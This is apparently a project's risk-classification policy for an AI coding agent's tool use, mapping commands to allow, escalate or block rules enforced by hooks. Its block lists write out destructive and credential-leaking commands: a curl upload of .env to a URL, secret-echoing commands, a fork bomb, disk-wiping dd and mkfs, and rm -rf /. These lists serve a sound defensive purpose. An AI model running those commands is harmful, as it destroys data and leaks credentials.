# Tool Risk Classification

**Version:** 1.0
**Date:** 2026-02-07
**Status:** Production

## Overview

This document classifies tools and operations by **risk level** based on **reversibility** and **blast radius**. Risk levels determine whether operations proceed automatically, require approval, or are blocked entirely. This classification is part of our [three-layer safety architecture](./safety-architecture.md).

## Risk Rubric

Operations are classified using two dimensions:

**1. Reversibility**

- Can the operation be undone easily?
- What is the cost of reversal?
- How much context is preserved after reversal?

**2. Blast Radius**

- How many systems/files/users does the operation affect?
- What is the potential for data loss or service disruption?
- Can the operation expose secrets or credentials?

## Risk Levels

### Low Risk (Proceed Automatically)

**Criteria:**

- Fully reversible
- Affects local state only
- No secrets exposure
- No production impact

**Required Behavior:** Proceed automatically, log operation

**Examples:**
| Operation | Reversibility | Blast Radius | Enforcement |
|-----------|---------------|--------------|-------------|
| `git status` | N/A (read-only) | None | Auto-allow |
| `git diff` | N/A (read-only) | None | Auto-allow |
| `git log` | N/A (read-only) | None | Auto-allow |
| Reading files | N/A (read-only) | None | Auto-allow |
| `npm test` | N/A (read-only) | None | Auto-allow |
| Creating feature branch | Reversible (delete branch) | Low (local/remote branch only) | Auto-allow |
| Making commits | Reversible (`git reset`) | Low (local history) | Auto-allow |
| Listing files (`ls`) | N/A (read-only) | None | Auto-allow |

---

### Medium Risk (Proceed with Logging)

**Criteria:**

- Partially reversible
- Affects local/dev environment
- Time-consuming but safe
- No secrets exposure

**Required Behavior:** Proceed automatically, log prominently, prefer safe alternatives

**Examples:**
| Operation | Reversibility | Blast Radius | Enforcement |
|-----------|---------------|--------------|-------------|
| `npm run lint` | Reversible (output only) | None | Auto-allow (log) |
| `npm run build` | Reversible (delete dist/) | Low (build artifacts) | Auto-allow (log) |
| `npm run format` | Reversible (git reset) | Low (local code format) | Auto-allow (log) |
| `npm test -- --coverage` | Reversible (output only) | None | Auto-allow (log) |
| Type-checking (`tsc --noEmit`) | Reversible (output only) | None | Auto-allow (log) |
| Installing dependencies | Reversible (delete node_modules) | Low (local disk space) | Auto-allow (log) |

---

### High Risk (Require Approval or Block)

**Criteria:**

- Difficult to reverse OR
- Affects shared systems/production OR
- Potential for secrets exposure OR
- Modifies critical files

**Required Behavior:** Escalate to user for explicit approval, or block entirely

**Subcategories:**

#### High Risk - Deployments (Ask)

| Operation           | Reversibility                          | Blast Radius                     | Enforcement    |
| ------------------- | -------------------------------------- | -------------------------------- | -------------- |
| `cdk deploy`        | Partial (rollback possible but costly) | High (production infrastructure) | Hook escalates |
| `terraform apply`   | Partial (rollback possible but costly) | High (production infrastructure) | Hook escalates |
| `aws ... delete`    | Irreversible (data loss)               | High (production resources)      | Hook escalates |
| `terraform destroy` | Irreversible (data loss)               | High (production infrastructure) | Hook escalates |

#### High Risk - Publishing (Ask)

| Operation                 | Reversibility                          | Blast Radius             | Enforcement    |
| ------------------------- | -------------------------------------- | ------------------------ | -------------- |
| `npm publish`             | Irreversible (cannot un-publish)       | High (public registry)   | Hook escalates |
| `git push` to main/master | Reversible (revert commit) but visible | Medium (team visibility) | Hook escalates |

#### High Risk - Destructive Git (Block)

| Operation                         | Reversibility                               | Blast Radius             | Enforcement |
| --------------------------------- | ------------------------------------------- | ------------------------ | ----------- |
| `git push --force` to main/master | Irreversible (rewrites history)             | High (team history loss) | Hook blocks |
| `git reset --hard`                | Irreversible (discards uncommitted changes) | Medium (local work loss) | Hook blocks |
| `git clean -fd`                   | Irreversible (deletes untracked files)      | Medium (local work loss) | Hook blocks |
| `git checkout .`                  | Irreversible (discards uncommitted changes) | Medium (local work loss) | Hook blocks |

#### High Risk - File Deletion (Ask or Block)

| Operation             | Reversibility                | Blast Radius                | Enforcement    |
| --------------------- | ---------------------------- | --------------------------- | -------------- |
| `rm -rf <directory>`  | Irreversible                 | Depends on directory        | Hook escalates |
| `rm -rf node_modules` | Reversible (`npm install`)   | Low (local build artifacts) | Hook escalates |
| `rm -rf dist/`        | Reversible (`npm run build`) | Low (local build artifacts) | Hook escalates |
| `rm -rf infra/`       | Irreversible (code loss)     | High (production impact)    | Hook blocks    |

#### High Risk - Secrets Exposure (Block)

| Operation                        | Reversibility                       | Blast Radius                       | Enforcement |
| -------------------------------- | ----------------------------------- | ---------------------------------- | ----------- |
| `cat .env`                       | N/A (read-only) but exposes secrets | High (credential exposure in logs) | Hook blocks |
| `echo $AWS_SECRET_ACCESS_KEY`    | N/A but exposes secrets             | High (credential exposure)         | Hook blocks |
| `git add .env`                   | Reversible (`git reset`) but risky  | High (commits secrets to history)  | Hook blocks |
| `curl --data-binary @.env <url>` | Irreversible (exfiltration)         | High (credential theft)            | Hook blocks |

#### High Risk - Protected File Edits (Block or Ask)

| Operation                | Reversibility                            | Blast Radius                | Enforcement    |
| ------------------------ | ---------------------------------------- | --------------------------- | -------------- |
| Editing `CLAUDE.md`      | Reversible (git reset) but human-owned   | Medium (agent instructions) | Hook blocks    |
| Editing `.env`           | Reversible (git reset) but dangerous     | High (secrets exposure)     | Hook blocks    |
| Editing lockfiles        | Reversible (git reset) but breaks builds | Medium (dependency drift)   | Hook blocks    |
| Editing `.gitignore`     | Reversible (git reset) but risky         | High (accidental exposure)  | Hook blocks    |
| Editing `infra/`         | Reversible (git reset)                   | High (production impact)    | Hook escalates |
| Editing `.github/`       | Reversible (git reset)                   | High (CI/CD impact)         | Hook escalates |
| Editing `.claude/hooks/` | Reversible (git reset)                   | High (safety enforcement)   | Hook escalates |

---

### Catastrophic (Always Block)

**Criteria:**

- Irreversible system-level damage
- Data loss across system
- Potential for system corruption

**Required Behavior:** Block unconditionally, never allow

**Examples:**
| Operation | Reversibility | Blast Radius | Enforcement |
|-----------|---------------|--------------|-------------|
| `rm -rf /` | Irreversible (system destroyed) | Catastrophic (OS deleted) | Hook blocks |
| `rm -rf ~` | Irreversible (user data destroyed) | Catastrophic (all files deleted) | Hook blocks |
| `:(){ :\|:& };:` (fork bomb) | Reversible (reboot) but disruptive | High (system hangs) | Hook blocks |
| `dd if=/dev/zero of=/dev/sda` | Irreversible (disk destroyed) | Catastrophic (data loss) | Hook blocks |
| `mkfs /dev/sda` | Irreversible (filesystem destroyed) | Catastrophic (data loss) | Hook blocks |
| `chmod -R 777 /` | Reversible (restore permissions) but devastating | Catastrophic (security hole) | Hook blocks |

---

## Operations Matrix

Complete reference table:

| Operation Category                     | Risk         | Required Behavior | Hook Enforcement                | Safer Alternative                       |
| -------------------------------------- | ------------ | ----------------- | ------------------------------- | --------------------------------------- |
| **Read Operations**                    |
| git status, git diff, git log          | Low          | Auto-allow        | None                            | N/A (already safe)                      |
| ls, cat, head, tail                    | Low          | Auto-allow        | None                            | N/A (already safe)                      |
| Reading files (Read tool)              | Low          | Auto-allow        | None                            | N/A (already safe)                      |
| npm test, npm run lint                 | Medium       | Auto-allow (log)  | None                            | N/A (already safe)                      |
| **Git Operations**                     |
| Creating feature branch                | Low          | Auto-allow        | None                            | N/A (already safe)                      |
| Making commits                         | Low          | Auto-allow        | None                            | N/A (already safe)                      |
| git push to feature branch             | Low          | Auto-allow        | None                            | N/A (already safe)                      |
| git push to main/master                | High         | Escalate          | bash-guard escalates            | Create feature branch, use PR           |
| git push --force to main/master        | Catastrophic | Block             | bash-guard blocks               | Use standard git push                   |
| git reset --hard                       | High         | Block             | bash-guard blocks               | git restore <file>, git status          |
| git clean -fd                          | High         | Block             | bash-guard blocks               | git status, manually delete             |
| git checkout .                         | High         | Block             | bash-guard blocks               | git restore <file>                      |
| **File Operations**                    |
| Editing implementation files           | Low          | Auto-allow        | tdd-guard validates test exists | Write tests first (TDD)                 |
| Editing CLAUDE.md                      | High         | Block             | file-guard blocks               | Ask user for explicit approval          |
| Editing .env                           | High         | Block             | file-guard blocks               | Edit .env.example instead               |
| Editing infra/                         | High         | Escalate          | file-guard escalates            | Ask user for explicit approval          |
| Editing .github/                       | High         | Escalate          | file-guard escalates            | Ask user for explicit approval          |
| rm -rf <directory>                     | High         | Escalate          | bash-guard escalates            | Use specific file deletion              |
| rm -rf /                               | Catastrophic | Block             | bash-guard blocks               | NEVER do this                           |
| **Secrets Operations**                 |
| cat .env                               | High         | Block             | bash-guard blocks               | Use .env.example                        |
| echo $AWS_SECRET                       | High         | Block             | bash-guard blocks               | Document env vars without values        |
| git add .env                           | High         | Block             | file-guard blocks               | Use .env.example                        |
| Committing files matching _.pem, _.key | High         | Block             | Secrets scan gate blocks        | Never commit credentials                |
| **Deployment Operations**              |
| cdk deploy                             | High         | Escalate          | bash-guard escalates            | Test in dev environment first           |
| terraform apply                        | High         | Escalate          | bash-guard escalates            | Run terraform plan first                |
| aws ... delete                         | High         | Escalate          | bash-guard escalates            | Confirm resource ID, check dependencies |
| npm publish                            | High         | Escalate          | bash-guard escalates            | Verify version, test package locally    |
| **Quality Gates**                      |
| npm run format                         | Medium       | Auto-allow (log)  | auto-format PostToolUse         | N/A (auto-runs after edits)             |
| npm run build                          | Medium       | Auto-allow (log)  | Quality gate                    | N/A (required before done)              |
| npm test -- --coverage                 | Medium       | Auto-allow (log)  | Quality gate                    | N/A (required before done)              |
| **System Operations**                  |
| Fork bomb                              | Catastrophic | Block             | bash-guard blocks               | NEVER do this                           |
| dd to /dev/sd\*                        | Catastrophic | Block             | bash-guard blocks               | NEVER do this                           |
| mkfs                                   | Catastrophic | Block             | bash-guard blocks               | NEVER do this                           |
| sudo rm                                | High         | Block             | bash-guard blocks               | Use non-sudo rm for specific files      |
| chmod -R 777 /                         | Catastrophic | Block             | bash-guard blocks               | NEVER do this                           |

---

## Approval Checklist (High-Risk Operations)

When requesting user approval for high-risk operations, provide:

1. **Exact command** — Full command with all parameters
2. **Target environment** — dev / staging / production
3. **Impact scope** — What systems/files/users are affected
4. **Reversibility** — Can this be undone? How?
5. **Rollback plan** — Steps to reverse if something goes wrong
6. **Why now** — Justification for running this operation

**Example:**

```
⚠️ High-Risk Operation: Deploy to Production

Command: cdk deploy --app "npx ts-node infra/bin/app.ts" --all
Target: Production (AWS Account: xxxx1234)
Impact: Updates 3 stacks (API, Database, Frontend)
Reversibility: Partial (can rollback, but some state changes persist)
Rollback: cdk deploy --app ... --rollback
Why: Deploy Story 2.3 (User Authentication) to production

Approve? (y/n)
```

---

## Escalation Rules

### When to Escalate to Human

**Test Failures:**

- Auto-fix attempts exhausted (max 2 attempts)
- Tests fail repeatedly with same error
- Coverage drops below 80%

**Hook Violations:**

- Agent violates same hook >3 times in a row
- Agent attempts to bypass hook (--no-verify)
- Agent attempts prohibited operation repeatedly

**Merge Conflicts:**

- Complex conflicts (overlapping logic changes)
- Conflicts in critical files (infra/, .github/)
- Agent cannot auto-resolve

**Security Concerns:**

- Secrets detected in code changes
- Suspicious network operations (curl to unknown domains)
- Unexpected file modifications (outside story scope)

**Unclear Requirements:**

- Story acceptance criteria ambiguous
- Multiple valid implementation approaches
- User preference needed (UI/UX decisions)

---

## How to Extend

When adding new tools or operations:

1. **Classify the operation** using the rubric (reversibility + blast radius)
2. **Determine risk level** (Low / Medium / High / Catastrophic)
3. **Choose enforcement strategy:**
   - Low → Allow automatically
   - Medium → Allow with logging
   - High → Escalate to user or block
   - Catastrophic → Always block

4. **Update hook scripts** if needed:
   - Add pattern to `bash-guard.js` (for bash commands)
   - Add path to `file-guard.js` (for file operations)
   - Add check to domain-specific guard (architecture, import, tdd)

5. **Update this document** with the new operation and its classification

6. **Test** the enforcement:

   ```bash
   # For bash operations
   .claude/hooks/bash-guard.js "<command>"

   # For file operations
   .claude/hooks/file-guard.js "<file-path>"
   ```

---

## Enforcement Locations

| Risk Level      | Enforcement Layer | Location                      | Behavior                               |
| --------------- | ----------------- | ----------------------------- | -------------------------------------- |
| Low             | None              | N/A                           | Proceed automatically                  |
| Medium          | Logging           | Various hooks                 | Log operation, proceed                 |
| High (Escalate) | bash-guard hook   | `.claude/hooks/bash-guard.js` | Prompt user for approval               |
| High (Block)    | Multiple hooks    | bash-guard, file-guard, etc.  | Block operation, show safe alternative |
| Catastrophic    | bash-guard hook   | `.claude/hooks/bash-guard.js` | Block unconditionally                  |

**Orchestrator Layer:**

- Secrets scan gate (Phase 2.2) — Blocks if secrets detected
- Quality gates (Phase 2.2) — Blocks completion if tests fail
- Human checkpoints (4 phases) — Requires explicit approval

---

## Further Reading

- [Safety Architecture Overview](./safety-architecture.md) — Three-layer model
- [Hook System Details](./hook-system.md) — All hooks + enforcement behavior
- [Orchestrator Safety Details](./orchestrator-safety.md) — Workflow-level safety
- [Secrets and Config](./secrets-and-config.md) — What never goes in the repo

---

**Last Updated:** 2026-02-07
**Maintainer:** Stephen (human-owned)
**Status:** Production (Epic 1 complete)
